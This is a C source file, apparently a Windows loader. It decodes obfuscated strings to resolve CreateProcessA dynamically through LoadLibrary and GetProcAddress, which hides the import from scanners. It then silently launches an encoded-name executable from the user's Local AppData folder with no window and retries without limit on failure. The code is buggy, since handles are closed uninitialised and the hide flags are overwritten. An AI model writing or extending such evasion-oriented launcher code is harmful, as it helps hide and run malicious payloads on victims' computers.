#include <windows.h>
#include <shlobj.h>
#include <stdbool.h>
#include <stdio.h>
#include "enc.h"

typedef BOOL (WINAPI *LPCTRPRC)(
    LPCSTR,
    LPSTR,
    LPSECURITY_ATTRIBUTES,
    LPSECURITY_ATTRIBUTES,
    BOOL,
    DWORD,
    LPVOID,
    LPCSTR,
    LPSTARTUPINFOA,
    LPPROCESS_INFORMATION
);


void crtProc(LPSTR szPath, STARTUPINFO si, PROCESS_INFORMATION pi){
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si); // Crucially, set the size of the STARTUPINFO structure
    ZeroMemory(&pi, sizeof(pi));

    LPCTRPRC crtprc = NULL;
    // decode encoded lib name 
    char* kr32dec = Decode("ICYjLC0ncGNsLCcv");
    printf("Printed kr32: %s\n", kr32dec);
    char* crtprocN = Decode("CDE0IzwuEyMtKy4wIgM=");
    printf("Printed crtproc: %s\n", crtprocN);
    // LoadLibrary
    HMODULE kn32 = LoadLibraryA(kr32dec);
    if (kn32 == NULL){
        printf("Failed to load lib: %lu\n", GetLastError());
        return;
    }
    // Get Function Adress(CreateProcessA)
    printf("Try to call getprocaddr with this arguments: %s, %s\n", kr32dec, crtprocN);
    crtprc = (LPCTRPRC)GetProcAddress(kn32, crtprocN);
    if (crtprc == NULL ){
        printf("Failed to get procaddress: %lu\n", GetLastError());
        return;
    } 

    // Run that function
    
    bool r = crtprc(NULL,
    szPath,
    NULL,
    NULL,
    FALSE,
    CREATE_NO_WINDOW,
    NULL,
    NULL,
    &si,
    &pi);

    if ( r==0 ){
        printf("Failed to crtproc: %lu\n", GetLastError());
        crtProc(szPath, si, pi);
    } 
    else{
        printf("Successfully created process");
    }
    FreeLibrary(kn32);
}

int main() {
    
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char exPath[20];
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    TCHAR szPath[MAX_PATH];

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si); // Crucially, set the size of the STARTUPINFO structure
    ZeroMemory(&pi, sizeof(pi));
    char* exPTDEC = Decode("KC84JyY/bTQ6LQ==");
    char* dot = strchr(exPTDEC, '.');
    
    printf("Printed exe filename: %s\n",exPTDEC); 
    snprintf(exPath, sizeof(exPath),"\\%s", exPTDEC);
    printf("Full Exepath is: %s", exPath);
    // LoadLibrary
    // Get Function Adress (SHGetFolderPath)
    // Run that function
    if(SUCCEEDED(SHGetFolderPath(NULL, 
        CSIDL_LOCAL_APPDATA, 
        NULL, 
        0, 
        szPath))) 
    {
        strcat_s(szPath, sizeof(szPath)/sizeof(TCHAR), exPath);
        printf("szPath is: %s\n", szPath);
        crtProc(szPath, si, pi);
    }

    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );


    return 0;
}
